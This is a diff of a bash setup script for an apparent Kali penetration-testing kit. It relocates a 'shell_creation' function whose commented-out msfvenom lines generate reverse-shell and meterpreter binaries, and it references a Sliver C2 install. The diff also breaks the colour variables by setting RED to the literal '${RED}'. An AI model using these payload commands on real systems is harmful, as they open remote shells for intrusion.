@@ -4,8 +4,8 @@
 dldir="$HOME/Downloads"
 homedir="$HOME"
 kit_location="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
-RED='\033[0;31m'
-GREEN='\033[0;32m'
+RED='${RED}'
+GREEN='${GREEN}'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
 kit_log="${kit_location}/kit_log.txt"
@@ -241,27 +241,6 @@ tool_update() {
     return 0
 }
 
-shell_creation() {
-    # This grabs the IP address of tun0 and uses it to start generating malicious binaries
-    ## TODO: Create a method to select what interface you want to use
-    # ip_addr=$(ip addr show tun0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-    # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-    # This port is used for malicious binary generation
-    # listen_port=6969
-    # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
-    # listen_port=6969
-    #echo "Interface address is: $ip_addr"
-    print_message "info" "Interface address is: $ip_addr"
-    #echo "Port being used for shells is $listen_port"
-    print_message "info" "Port being used for shells is $listen_port"
-    #echo "                           Nice"
-    print_message "info" "                           Nice"
-    # msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
-    # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
-    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
-    #echo "Did I work? doubtful!"
-    print_message "info" "Did I work? doubtful!"
-}
 
 c2_sliver_install() {
     # variable used for saving files
@@ -290,7 +269,13 @@ c2_sliver_install() {
 }
 
 hostfilereset() {
-    run_and_log sudo tee /etc/hosts 1>/dev/null < hosts.txt
+    echo "127.0.0.1 localhost
+127.0.1.1   kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters" > /etc/hosts
     print_message "green" "Your /etc/hosts file has been reset"
 }
 
@@ -412,6 +397,7 @@ system_update() {
     print_message "good" "Finished SYSTEM setup"
 }
 
+#Throw test cases into here, invoke with -test
 function test {
     echo $(whoami) # The current user
     echo "Kit.py Location: $kit_location"
@@ -428,3 +414,32 @@ function jon {
     echo "^^^^^^^^^^^\`^^^^^^^^"
     echo "Ol' Jon, kickin' them rocks again \n"
 }
+
+##### FUNCTION PURGATORY #####
+## HERE LIES UNTESTED AND CURRENTLY UNUSED FUNCTIONS ##
+
+silence_pcbeep () { # I stop the ridiculous terminal beeping !
+    echo -e "blacklist pcspkr" > /etc/modprobe.d/nobeep.conf
+    echo -e "\n  ${GREEN} Terminal Beep Silenced! /etc/modprobe.d/nobeep.conf \n"
+    }
+
+shell_creation() {
+  # This grabs the IP address of tun0 and uses it to start generating malicious binaries
+  ## TODO: Create a method to select what interface you want to use
+  # ip_addr=$(ip addr show tun0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
+  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
+  # This port is used for malicious binary generation
+  # listen_port=6969
+  # ip_addr=$(ip addr show eth0 | grep "\<inet\>" | awk '{ print $2 }' | awk -F "/" '{ print $1 }' | tr -d '\n')
+  # listen_port=6969
+  echo "Interface address is: $ip_addr"
+  echo "Port being used for shells is $listen_port"
+  echo "                           Nice"
+  # msfvenom -p linux/x64/shell_reverse_tcp RHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
+  # msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f elf > /tmp/test.elf
+  # msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_addr LPORT=$listen_port -f exe > /tmp/test.exe
+  echo "Did I work? doubtful!"
+}
+
+
+###################
